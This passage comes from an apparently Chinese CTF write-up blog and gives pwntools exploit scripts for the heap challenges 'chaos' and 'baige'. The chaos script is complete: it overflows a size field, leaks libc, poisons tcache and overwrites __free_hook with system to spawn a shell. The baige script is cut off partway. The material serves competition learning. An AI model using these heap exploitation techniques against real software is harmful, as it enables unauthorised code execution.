class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd:SH0w \\nopcode:2\\n'</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>> '</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd:Ed1t \\nopcode:3\\n'</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>> '</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'>>> '</span> <span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd:D3l4te \\nopcode:4\\n'</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>> '</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span></code></pre>\n<p>之后发现用户输入的 size 是保存在堆块之中的，而且刚好可以覆盖掉，那么我们直接将其覆盖得特别大，之后就可以溢出修改 chunk 头之类的地方，每一次指令会申请 0x20 大小的 chunk ，可以通过切割 unsorted bin 得到 libc 基地址，之后伪造 tcache 的 fd 就可以申请到 __free_hook</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\">#context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./chaos'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-arm', binary,'-g','1234'])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','','-g','1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'8.134.37.86'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'28128'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">exhaust</span><span class=\"token punctuation\">(</span> pwn <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> p\n    i <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            i<span class=\"token operator\">+=</span><span class=\"token number\">1</span>\n            pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            lg<span class=\"token punctuation\">(</span><span class=\"token string\">'times ======== > '</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span>\n            p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>DEBUG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size <span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd:Cr4at3 \\nopcode:1\\n'</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>> '</span> <span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'>>> '</span> <span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd:SH0w \\nopcode:2\\n'</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>> '</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd:Ed1t \\nopcode:3\\n'</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>> '</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'>>> '</span> <span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd:D3l4te \\nopcode:4\\n'</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>> '</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n\n<span class=\"token comment\"># dbg('strchr')</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x208</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token number\">0x200</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x208</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token number\">0x200</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x208</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token number\">0x200</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x208</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token number\">0x200</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x208</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token number\">0x200</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x208</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token number\">0x200</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># dbg('* $rebase(0x000000000000F9F)')</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">5</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x218</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x220</span><span class=\"token operator\">*</span><span class=\"token number\">5</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\n__malloc_hook <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span>\n__free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\nsystem <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\nbinsh <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 4c0</span>\n\n<span class=\"token comment\"># dbg()</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x208</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x200</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x200</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">,</span> __free_hook <span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0x221</span> <span class=\"token punctuation\">,</span> __free_hook <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> payload <span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x208</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x208</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh\\x00'</span> <span class=\"token punctuation\">,</span> system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># dbg()</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># dbg()</span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   chaos.py\n@Time    :   2021/09/23 10:10:53\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"长安杯-baige\"><a class=\"markdownIt-Anchor\" href=\"#长安杯-baige\">#</a> 长安杯 - baige</h1>\n<p>这题 size 就算出问题也会被写到 size_list 中，比较时也会按照无符号长整型比较，直接写个大 size 再打就完了</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\"># context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./baige'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\"># p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary,'-g','1234'])</span>\n    <span class=\"token comment\"># p = process(['qemu-aarch64','-L','','-g','1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'113.201.14.253'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'21111'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">,</span> size <span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'idx'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'size'</span> <span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span>\n    sla<span class=\"token 